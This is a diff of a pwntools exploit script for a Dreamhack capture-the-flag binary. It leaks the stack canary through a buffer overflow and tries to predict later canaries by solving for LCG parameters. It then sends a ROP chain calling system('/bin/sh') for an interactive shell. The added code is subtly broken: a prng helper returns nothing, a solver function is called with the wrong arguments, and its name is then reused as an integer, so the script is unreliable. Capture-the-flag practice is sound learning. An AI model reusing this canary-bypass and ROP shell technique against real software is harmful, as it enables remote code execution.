@@ -6,6 +6,7 @@ context.terminal = ['tmux', 'splitw', '-h']
 libc = ELF('./libc.so.6')
 
 HOST, PORT = 'host8.dreamhack.games 1234'.split()
+MOD = 2 ** 32
 
 def slog(n, a): return success(': '.join([n, hex(a)]))
 
@@ -29,6 +30,19 @@ def send(pay):
     p.recvuntil(b'Your string: ')
     p.recvuntil(pay)
 
+def prng(x, mul, inc):
+    x = (x * mul + inc) & 0xFFFFFFFF
+
+def minary(s0, s1, s2):
+    a = (s1 - s0) & 0xffffffff
+    b = (s2 - s1) & 0xffffffff
+    if a % 2 == 0:
+        return None  # inverse 없음, 다시 누출 필요
+    inv = pow(a, -1, MOD)
+    mul = (b * inv) & 0xffffffff
+    inc = (s1 - mul * s0) & 0xffffffff
+    return mul, inc
+
 pay = b'A'*0xf8
 send(pay)
 
@@ -36,6 +50,24 @@ cnry = u64(p.recv(8))
 sfp = u64(b'\x00' * 2 + p.recv(6))
 slog("cnry", cnry)
 slog("sfp", sfp)
+
+pay = b'A'*0xf8
+send(pay)
+
+cnry2 = u64(p.recv(8))
+slog("cnry2", cnry2)
+
+s0 = (cnry >> 32) & 0xFFFFFFFF
+s1 = cnry & 0xFFFFFFFF
+
+s2 = (cnry2 >> 32) & 0xFFFFFFFF
+s3 = cnry2 & 0xFFFFFFFF
+
+x = minary(s0, s1, s2)
+
+mul, inc = x
+s4 = minary(s3, mul, inc)
+s5 = minary(s4, mul, inc)
 
 pay = b'A'*0xf8 + p64(cnry) + b'A'*0x8 # ret
 send(pay)
@@ -80,11 +112,15 @@ ret = lb + rop.find_gadget(['ret'])[0]
 slog("system", system)
 slog("binsh", binsh)
 
-pay = b'A'*0xf8 + p64(cnry) + b'A'*0x8
-# pay += p64(ret)
+minary = (s4 << 32) | s5
+
+pay = b'quit'
+pay += b'A'*(0xf8 - len(pay))
+pay += p64(minary)
+pay += b'B'*0x8
 pay += p64(pop_rdi) + p64(binsh)
 pay += p64(system)
 
-p.sendlineafter(b'Enter a string > ', b'quit')
+p.sendlineafter(b'Enter a string > ', pay)
 
 p.interactive()
